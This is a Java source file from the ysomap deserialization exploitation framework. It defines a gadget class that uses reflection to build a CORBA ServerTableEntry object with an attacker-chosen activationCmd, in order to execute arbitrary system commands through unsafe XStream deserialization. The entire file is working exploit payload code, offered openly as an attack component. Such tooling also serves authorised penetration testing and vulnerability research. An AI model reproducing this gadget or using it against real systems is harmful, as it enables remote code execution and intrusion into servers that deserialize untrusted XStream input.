package ysomap.bullets.jdk;

import com.sun.corba.se.impl.activation.ServerTableEntry;
import com.sun.corba.se.impl.logging.ActivationSystemException;
import com.sun.corba.se.spi.activation.RepositoryPackage.ServerDef;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3P1g
 * @since 2021/3/11
 */
@Bullets
@Dependencies({"jdk"})
@Details("执行任意系统命令")
@Targets({Targets.XSTREAM})
@Authors({Authors.WH1T3P1G})
public class ServerTableEntryBullet implements Bullet<ServerTableEntry> {

    @NotNull
    @Require(name = "cmd", detail = "command")
    public String cmd;

    @Override
    public ServerTableEntry getObject() throws Exception {
        Object entry = ReflectionHelper.newInstance(
                "com.sun.corba.se.impl.activation.ServerTableEntry",
                new Class[]{ActivationSystemException.class, int.class, ServerDef.class, int.class, String.class, boolean.class, boolean.class},
                new Object[]{null,1,new ServerDef("","","","",""),1,"",true,false});
        ReflectionHelper.setFieldValue(entry, "activationCmd", cmd);
        return (ServerTableEntry) entry;
    }
}
